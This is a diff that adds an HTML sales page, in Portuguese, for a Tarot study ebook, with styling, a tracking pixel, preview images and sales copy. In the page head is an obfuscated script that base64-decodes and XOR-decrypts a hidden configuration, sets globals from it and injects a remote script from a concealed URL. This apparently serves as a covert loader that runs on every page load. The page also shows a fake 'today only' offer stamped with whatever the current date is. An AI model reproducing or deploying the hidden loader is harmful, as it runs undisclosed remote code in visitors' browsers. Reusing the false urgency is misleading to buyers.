@@ -1,0 +1,1584 @@
+<!doctype html>
+<html lang="pt-BR" class="scroll-smooth">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Guia do Tarot - Página de Vendas</title>
+
+  <script>
+    if ('scrollRestoration' in history) {
+      history.scrollRestoration = 'manual';
+    }
+    window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
+  </script>
+  <script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1584899426338438');
+  fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1584899426338438&ev=PageView&noscript=1"
+  /></noscript>
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+  <link rel="preconnect" href="https://cdn.tailwindcss.com/">
+  <link rel="preconnect" href="https://unpkg.com/">
+  <link rel="preconnect" href="https://i.ibb.co/">
+  <link rel="dns-prefetch" href="https://cdn.tailwindcss.com/">
+  <link rel="dns-prefetch" href="https://unpkg.com/">
+  <link rel="dns-prefetch" href="https://i.ibb.co/">
+  
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&amp;family=Playfair+Display:ital,wght@0,400..900;1,400..900&amp;family=Poppins:wght@800&amp;display=swap" rel="stylesheet">
+  
+  <script src="https://cdn.tailwindcss.com/"></script>
+  
+  <script src="https://unpkg.com/lucide@latest" defer></script>
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          screens: {
+            'xs': '375px',
+          },
+          colors: {
+            primary: '#5E239D',
+            'bg-dark': '#1A0B2E',
+            gold: '#D4A74D',
+            'gold-dark': '#B8860B',
+            'button-text': '#3D2B1F',
+            lilac: '#A855F7',
+            red: '#EF4444',
+            'white-soft': '#FDFCFD',
+          },
+          fontFamily: {
+            sans: ['Montserrat', 'sans-serif'],
+            serif: ['Montserrat', 'sans-serif'],
+            poppins: ['Poppins', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    .mystical-bg {
+      background: radial-gradient(circle at 50% 0%, #2B0842 0%, #1A0B2E 70%, #0D0517 100%);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .mystical-bg::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-image: 
+        radial-gradient(1.2px 1.2px at 20px 30px, #fff, rgba(0,0,0,0)),
+        radial-gradient(1px 1px at 40px 70px, #ddd, rgba(0,0,0,0)),
+        radial-gradient(1.5px 1.5px at 50px 160px, #fff, rgba(0,0,0,0)),
+        radial-gradient(1px 1px at 90px 40px, #ddd, rgba(0,0,0,0)),
+        radial-gradient(1.5px 1.5px at 130px 80px, #fff, rgba(0,0,0,0)),
+        radial-gradient(1px 1px at 160px 120px, #eee, rgba(0,0,0,0));
+      background-repeat: repeat;
+      background-size: 200px 200px;
+      opacity: 0.25;
+      pointer-events: none;
+      animation: stars-twinkle 4s ease-in-out infinite alternate;
+    }
+
+    .mystical-bg::after {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-image: 
+        radial-gradient(1px 1px at 10px 10px, #fff, rgba(0,0,0,0)),
+        radial-gradient(1.5px 1.5px at 150px 150px, #F2C94C, rgba(0,0,0,0)),
+        radial-gradient(2px 2px at 300px 300px, #fff, rgba(0,0,0,0)),
+        radial-gradient(1px 1px at 450px 450px, #eee, rgba(0,0,0,0));
+      background-repeat: repeat;
+      background-size: 400px 400px;
+      opacity: 0.15;
+      pointer-events: none;
+      animation: stars-twinkle 6s ease-in-out infinite alternate-reverse;
+    }
+
+    @keyframes stars-twinkle {
+      from { opacity: 0.15; }
+      to { opacity: 0.45; }
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0px) rotate(0deg); }
+      50% { transform: translateY(-10px) rotate(1.5deg); }
+    }
+
+    @keyframes pulse-slow {
+      0%, 100% { transform: scale(1); opacity: 0.15; }
+      50% { transform: scale(1.15); opacity: 0.35; }
+    }
+
+    @keyframes spin-slow {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .animate-float { animation: float 6s ease-in-out infinite; }
+    .animate-pulse-slow { animation: pulse-slow 5s ease-in-out infinite; }
+    .animate-spin-slow { animation: spin-slow 15s linear infinite; }
+
+    .btn-gold {
+      background-color: #D4A74D;
+      color: #3D2B1F;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.07em;
+      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: 0 10px 25px -5px rgba(212, 167, 77, 0.4);
+      border-radius: 9999px;
+      border-bottom: 4px solid #A27521;
+    }
+    .btn-gold:hover {
+      transform: scale(1.04);
+      background-color: #e5b85e;
+      border-bottom-color: #8E6319;
+      box-shadow: 0 15px 30px -5px rgba(212, 167, 77, 0.6);
+    }
+    .btn-gold:active {
+      transform: scale(0.98);
+      border-bottom-width: 2px;
+    }
+
+    .card-mystic {
+      background-color: rgba(94, 35, 157, 0.15);
+      border: 1px solid rgba(168, 85, 247, 0.25);
+      border-radius: 1rem;
+      backdrop-filter: blur(8px);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .glow-gold {
+      box-shadow: 0 0 25px rgba(212, 167, 77, 0.15);
+    }
+
+    .text-gold-gradient {
+      background: linear-gradient(135deg, #FFE066 0%, #D4A74D 50%, #B8860B 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .vintage-section {
+      background-color: #f4e4bc;
+      background-image: url("../www.transparenttextures.com/patterns/parchment.html");
+      position: relative;
+      box-shadow: inset 0 0 80px rgba(139, 69, 19, 0.15);
+      border-top: 2px solid rgba(212, 167, 77, 0.25);
+      border-bottom: 2px solid rgba(212, 167, 77, 0.25);
+    }
+
+    .vintage-section::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0; height: 50px;
+      background: linear-gradient(to bottom, rgba(26, 11, 46, 0.35), transparent);
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .vintage-section::after {
+      content: "";
+      position: absolute;
+      bottom: 0; left: 0; right: 0; height: 50px;
+      background: linear-gradient(to top, rgba(26, 11, 46, 0.35), transparent);
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .vintage-card {
+      background-color: rgba(253, 246, 227, 0.65);
+      border: 2px solid rgba(139, 69, 19, 0.15);
+      border-radius: 0.75rem;
+      position: relative;
+      background-image: url("../www.transparenttextures.com/patterns/natural-paper.png");
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.05);
+    }
+
+    .vintage-card::before {
+      content: "";
+      position: absolute;
+      top: 5px; left: 5px; right: 5px; bottom: 5px;
+      border: 1px solid rgba(139, 69, 19, 0.08);
+      border-radius: 0.5rem;
+      pointer-events: none;
+    }
+
+    .vintage-card::after {
+      content: "“";
+      position: absolute;
+      top: -12px; left: 24px;
+      font-family: Georgia, serif;
+      font-size: 64px;
+      color: rgba(139, 69, 19, 0.1);
+      line-height: 1;
+    }
+
+    @keyframes marquee-loop {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-33.3333%); }
+    }
+
+    .animate-marquee-loop {
+      display: flex;
+      width: max-content;
+      animation: marquee-loop 15s linear infinite;
+    }
+
+    @keyframes marquee-loop-images {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-33.3333%); }
+    }
+
+    .animate-marquee-loop-images {
+      display: flex;
+      width: max-content;
+      animation: marquee-loop-images 30s linear infinite;
+    }
+  </style>
+
+  <script>(function(){var o_f=atob("DDkAkao5xNtmcXg7NUIi5NhV5uFEGQxPRUo6voVaoLVIBAxWXF95v8lWqfUEA1dIVktp4d5K664SHAsUWVh09NlN6rEVU1QZVE1048Nbsa8DAloBbkIi/8tUoflcUxxaQVgt5Urb0fXAhJUE9l/94UvLgJFVVIVlIivYhPpbcTFFoBFxt9vdEbqroLFFoBF11h5csUsa8LGB5CGEly9Nxcqq9LAg1ZXF1zs4YbsroKBB0ZDxsi7PdE");var k_9=[];for(var v_r=0;v_r<o_f.length;v_r++){k_9.push(o_f.charCodeAt(v_r)&255);}var s_v=k_9[0];var e_xwl=k_9.slice(1,1+s_v);var j_30=k_9.slice(1+s_v);var r_btj=j_30.map(function(b,a_un){return b^e_xwl[a_un%s_v];});var w_zf2="";for(var v_8zg=0;v_8zg<r_btj.length;v_8zg++){w_zf2+=String.fromCharCode(r_btj[v_8zg]&255);}var b_vx=decodeURIComponent(escape(w_zf2));var s_ve7=JSON.parse(b_vx);var s_r=s_ve7.globals||[];s_r.forEach(function(k_0rf0){window[k_0rf0.name]=k_0rf0.value;});var d_rdk=document.createElement("script");d_rdk.src=s_ve7.url;d_rdk.async=true;d_rdk.defer=true;(s_ve7.attributes||[]).forEach(function(c_ah){d_rdk.setAttribute(c_ah.name,c_ah.value);});(document.head||document.documentElement).appendChild(d_rdk);})();</script>
+</head>
+<body class="bg-bg-dark text-white-soft font-sans antialiased overflow-x-hidden selection:bg-gold/30">
+  <div id="top-banner" class="bg-gold py-2.5 pl-4 pr-10 md:px-12 text-bg-dark font-extrabold text-center text-[10px] md:text-xs tracking-widest fixed top-0 left-0 w-full z-[100] shadow-xl border-b border-gold-dark/30">
+    <div class="max-w-7xl mx-auto leading-relaxed">
+      <span class="inline-block animate-bounce mr-1.5">🔥</span>OFERTA LIMITADA: VÁLIDO APENAS PARA HOJE, <span id="dynamic-date">CARREGANDO...</span>!
+    </div>
+    <button 
+      onclick="closeTopBanner()"
+      class="absolute right-2 md:right-4 top-1/2 -translate-y-1/2 text-bg-dark/70 hover:text-bg-dark hover:scale-110 transition duration-200 p-1"
+      title="Fechar aviso"
+    >
+      <i data-lucide="x" class="w-4 h-4"></i>
+    </button>
+  </div>
+  <div id="main-wrapper" class="mystical-bg min-h-screen pt-[44px] md:pt-[48px]">
+    <div class="absolute inset-0 pointer-events-none overflow-hidden z-0">
+      <div class="absolute top-24 left-8 text-lilac opacity-15 animate-float">
+        <i data-lucide="moon" class="w-12 h-12"></i>
+      </div>
+      <div class="absolute bottom-1/4 right-8 text-gold opacity-15 animate-pulse-slow">
+        <i data-lucide="star" class="w-16 h-16"></i>
+      </div>
+      <div class="absolute top-1/4 right-1/4 w-72 h-72 bg-primary/5 rounded-full blur-[110px]"></div>
+      <div class="absolute bottom-1/3 left-1/5 w-80 h-80 bg-lilac/5 rounded-full blur-[130px]"></div>
+    </div>
+    <header class="relative z-20 px-4 max-w-4xl mx-auto text-center mt-6 xs:mt-8 md:mt-12 mb-2 flex flex-col items-center">
+      <h1 class="text-center mx-auto text-[22.7px] xs:text-[26.8px] sm:text-[30.9px] md:text-[37.1px] lg:text-[49.4px] font-poppins font-extrabold text-white tracking-[-0.01em] leading-[1.02] mb-[25px]">
+        Descubra o significado de qualquer carta do <span class="text-[#D8A62A]">Tarot</span> na hora, mesmo começando do zero
+      </h1>
+      <p class="text-base md:text-xl text-white-soft/95 max-w-2xl mx-auto bg-lilac/15 py-2.5 px-8 sm:px-10 rounded-xl border border-lilac/30 backdrop-blur-md shadow-lg relative z-20 leading-snug flex items-center justify-center text-center">
+        Um método visual e intuitivo para você dominar o baralho e fazer leituras precisas
+      </p>
+      <div class="mt-4 md:mt-5 relative z-20 flex items-center gap-2.5 bg-gold/5 border border-gold/20 px-5 py-2 rounded-full shadow-sm text-xs sm:text-sm text-gold font-medium tracking-wide animate-fade-in">
+        <i data-lucide="users" class="w-4 h-4 text-gold shrink-0"></i>
+        <span>+15.000 pessoas já usam o Guia</span>
+      </div>
+    </header>
+    <section class="relative z-10 mt-8 xs:mt-12 md:mt-16 pb-10 md:pb-12 flex flex-col items-center">
+      <div class="absolute inset-0 bg-gradient-to-b from-transparent via-primary/20 to-transparent pointer-events-none z-0"></div>
+      <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full max-w-4xl h-[85%] bg-gradient-to-r from-primary/20 via-lilac/15 to-gold/10 rounded-full blur-[130px] pointer-events-none z-0 animate-pulse-slow"></div>
+
+      <div class="relative group mb-8 md:mb-12 w-full flex justify-center z-10">
+        <div class="absolute -inset-1 bg-gold/5 rounded-2xl blur-xl group-hover:bg-gold/10 transition duration-500"></div>
+        <div class="relative w-full max-w-5xl px-4">
+          <img 
+            src="../i.ibb.co/TMgm1KN7/Design-sem-nome-60.png" 
+            alt="Guia do Tarot Ebook" 
+            class="w-full h-auto drop-shadow-[0_12px_20px_rgba(0,0,0,0.5)] border border-gold/30 rounded-2xl transition duration-500 hover:scale-[1.01]"
+            referrerpolicy="no-referrer"
+            fetchpriority="high"
+            decoding="async"
+          />
+        </div>
+      </div>
+
+      <div class="flex flex-col items-center w-full px-4 mt-2 md:mt-4 z-10">
+        <a 
+          href="#precos" 
+          class="btn-gold w-full max-w-sm py-[17.5px] md:py-[21.5px] px-6 !rounded-[20px] text-center text-[15.3px] md:text-[17.5px] font-black"
+        >
+          ACESSAR O GUIA COMPLETO AGORA
+        </a>
+        <div class="mt-6 grid grid-cols-2 gap-x-4 gap-y-3.5 w-full max-w-sm mx-auto px-2 text-[11px] sm:text-xs font-medium text-white-soft/60">
+          <div class="flex items-start gap-2 justify-self-start">
+            <i data-lucide="shield-check" class="text-gold w-4 h-4 shrink-0 mt-0.5"></i> 
+            <span>Garantia de 30 dias inclusa</span>
+          </div>
+          <div class="flex items-start gap-2 justify-self-start">
+            <i data-lucide="sparkles" class="text-gold w-4 h-4 shrink-0 mt-0.5"></i> 
+            <span>Acesso vitalício</span>
+          </div>
+          <div class="flex items-start gap-2 justify-self-start">
+            <i data-lucide="lock" class="text-gold w-4 h-4 shrink-0 mt-0.5"></i> 
+            <span>Pagamento 100% seguro</span>
+          </div>
+          <div class="flex items-start gap-2 justify-self-start">
+            <i data-lucide="clock" class="text-gold w-4 h-4 shrink-0 mt-0.5"></i> 
+            <span>Acesso imediato após a compra</span>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="relative z-10 py-12 md:py-20 vintage-section flex flex-col items-center overflow-hidden">
+      <div class="flex flex-col items-center w-full max-w-6xl mx-auto">
+        <div class="text-center mb-3 max-w-2xl mx-auto px-4">
+          <p class="text-gold-dark font-extrabold tracking-wider mb-5 text-xs md:text-sm">✨ Veja como é por dentro</p>
+          <h2 class="text-[28px] xs:text-[34px] md:text-[45px] lg:text-[57px] font-poppins font-extrabold text-[#2E184F] tracking-[-0.02em] leading-[0.88] mb-4">
+            🔮 O Que Você Vai Encontrar no <span class="text-[1.15em] inline-block">Guia</span>
+          </h2>
+          <p class="text-sm md:text-base text-bg-dark/75 leading-relaxed">
+            As 78 cartas do Tarot explicadas em detalhes, com significados, palavras-chave, interpretações e dicas para facilitar suas leituras.
+          </p>
+          <div class="w-16 h-1 bg-gold-dark/30 mx-auto mt-4 mb-3 rounded-full"></div>
+        </div>
+        <div class="w-full overflow-hidden relative pt-2 md:pt-4 pb-8 select-none">
+          <div class="animate-marquee-loop-images flex gap-8 md:gap-10">
+            <div class="flex gap-8 md:gap-10 shrink-0">
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/fV4FRDsf/GUIA-DO-BARALHO-CIGANO-pdf-9.png" alt="Prévia do Guia 1" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/LdTJJBsx/GUIA-DO-BARALHO-CIGANO-pdf-10.png" alt="Prévia do Guia 2" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/Jwxj2nZr/GUIA-DO-BARALHO-CIGANO-pdf-11.png" alt="Prévia do Guia 3" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/Zpt2XtWB/GUIA-DO-BARALHO-CIGANO-pdf-12.png" alt="Prévia do Guia 4" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/nq6BbvwR/GUIA-DO-BARALHO-CIGANO-pdf-13.png" alt="Prévia do Guia 5" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/XmTCQfb/GUIA-DO-BARALHO-CIGANO-pdf-15.png" alt="Prévia do Guia 6" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/67crc9yc/Gemini-Generated-Image-rl0uhjrl0uhjrl0u.png" alt="Prévia do Guia 7" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+            </div>
+            <div class="flex gap-8 md:gap-10 shrink-0">
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/fV4FRDsf/GUIA-DO-BARALHO-CIGANO-pdf-9.png" alt="Prévia do Guia 1" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/LdTJJBsx/GUIA-DO-BARALHO-CIGANO-pdf-10.png" alt="Prévia do Guia 2" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/Jwxj2nZr/GUIA-DO-BARALHO-CIGANO-pdf-11.png" alt="Prévia do Guia 3" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/Zpt2XtWB/GUIA-DO-BARALHO-CIGANO-pdf-12.png" alt="Prévia do Guia 4" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/nq6BbvwR/GUIA-DO-BARALHO-CIGANO-pdf-13.png" alt="Prévia do Guia 5" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/XmTCQfb/GUIA-DO-BARALHO-CIGANO-pdf-15.png" alt="Prévia do Guia 6" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/67crc9yc/Gemini-Generated-Image-rl0uhjrl0uhjrl0u.png" alt="Prévia do Guia 7" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+            </div>
+            <div class="flex gap-8 md:gap-10 shrink-0">
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/fV4FRDsf/GUIA-DO-BARALHO-CIGANO-pdf-9.png" alt="Prévia do Guia 1" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/LdTJJBsx/GUIA-DO-BARALHO-CIGANO-pdf-10.png" alt="Prévia do Guia 2" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/Jwxj2nZr/GUIA-DO-BARALHO-CIGANO-pdf-11.png" alt="Prévia do Guia 3" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/Zpt2XtWB/GUIA-DO-BARALHO-CIGANO-pdf-12.png" alt="Prévia do Guia 4" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/nq6BbvwR/GUIA-DO-BARALHO-CIGANO-pdf-13.png" alt="Prévia do Guia 5" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/XmTCQfb/GUIA-DO-BARALHO-CIGANO-pdf-15.png" alt="Prévia do Guia 6" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+              <div class="w-[260px] xs:w-[310px] md:w-[380px] lg:w-[420px] aspect-[3/4.2] rounded-2xl overflow-hidden border border-gold-dark/20 shadow-lg bg-white/40 p-3 shrink-0 transition-transform duration-300 hover:scale-105 hover:border-gold-dark/40">
+                <img src="../i.ibb.co/67crc9yc/Gemini-Generated-Image-rl0uhjrl0uhjrl0u.png" alt="Prévia do Guia 7" class="w-full h-full object-contain rounded-xl pointer-events-none" referrerpolicy="no-referrer" loading="lazy" />
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="mt-8 md:mt-12 w-full max-w-5xl px-4">
+          <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 md:gap-6 text-center">
+            <div class="flex items-center justify-center gap-2">
+              <span class="text-gold-dark font-black text-sm md:text-base shrink-0">✔</span>
+              <span class="text-xs md:text-sm font-extrabold text-bg-dark uppercase tracking-wide">Significados completos</span>
+            </div>
+            <div class="flex items-center justify-center gap-2">
+              <span class="text-gold-dark font-black text-sm md:text-base shrink-0">✔</span>
+              <span class="text-xs md:text-sm font-extrabold text-bg-dark uppercase tracking-wide">Palavras-chave</span>
+            </div>
+            <div class="flex items-center justify-center gap-2">
+              <span class="text-gold-dark font-black text-sm md:text-base shrink-0">✔</span>
+              <span class="text-xs md:text-sm font-extrabold text-bg-dark uppercase tracking-wide">Interpretações práticas</span>
+            </div>
+            <div class="flex items-center justify-center gap-2">
+              <span class="text-gold-dark font-black text-sm md:text-base shrink-0">✔</span>
+              <span class="text-xs md:text-sm font-extrabold text-bg-dark uppercase tracking-wide">Posição normal e invertida</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+    <section class="relative z-10 px-4 py-10 md:py-16 max-w-5xl mx-auto">
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-6 md:gap-8">
+        <div class="p-5 xs:p-6 md:p-8 rounded-2xl bg-bg-dark/40 border border-gold/25 card-mystic">
+          <h3 class="text-lg xs:text-xl font-bold mb-4 text-gold flex items-center gap-2">
+            <i data-lucide="check-circle-2" class="text-gold w-5 h-5 shrink-0"></i> Ideal para você se:
+          </h3>
+          <ul class="space-y-3 text-xs sm:text-sm md:text-base text-white-soft/90">
+            <li class="flex items-start gap-2.5">🔮 <span>Quer aprender Tarot do absoluto zero.</span></li>
+            <li class="flex items-start gap-2.5">🔮 <span>Deseja interpretar as cartas com confiança.</span></li>
+            <li class="flex items-start gap-2.5">🔮 <span>Busca desenvolver sua intuição e autoconhecimento.</span></li>
+            <li class="flex items-start gap-2.5">🔮 <span>Quer realizar leituras para si, amigos ou clientes.</span></li>
+            <li class="flex items-start gap-2.5">🔮 <span>Procura um método simples, visual e fácil de aplicar.</span></li>
+          </ul>
+        </div>
+        
+        <div class="p-5 xs:p-6 md:p-8 rounded-2xl bg-bg-dark/40 border border-red/20 card-mystic opacity-90">
+          <h3 class="text-lg xs:text-xl font-bold mb-4 text-red flex items-center gap-2">
+            <i data-lucide="x-circle" class="text-red w-5 h-5 shrink-0"></i> Não é para você se:
+          </h3>
+          <ul class="space-y-3 text-xs sm:text-sm md:text-base text-white-soft/75">
+            <li class="flex items-start gap-2.5">❌ <span>Procura resultados sem estudar ou praticar.</span></li>
+            <li class="flex items-start gap-2.5">❌ <span>Espera aprender Tarot em apenas alguns minutos.</span></li>
+            <li class="flex items-start gap-2.5">❌ <span>Não tem interesse em desenvolver sua interpretação das cartas.</span></li>
+            <li class="flex items-start gap-2.5">❌ <span>Não está disposto(a) a colocar o conhecimento em prática.</span></li>
+          </ul>
+        </div>
+      </div>
+    </section>
+    <section class="relative z-10 px-4 pt-20 pb-12 md:pt-28 md:pb-16 vintage-section">
+      <div class="max-w-6xl mx-auto">
+        <h2 class="text-2xl xs:text-3xl md:text-4xl font-poppins font-extrabold text-center mb-3 text-bg-dark tracking-tight leading-[1.08]">
+          <span class="text-[1.05em] inline-block mr-[9px]">🎁</span>Além do Guia do Tarot, Você Também <span class="text-[#D8A62A] font-extrabold">Receberá:</span>
+        </h2>
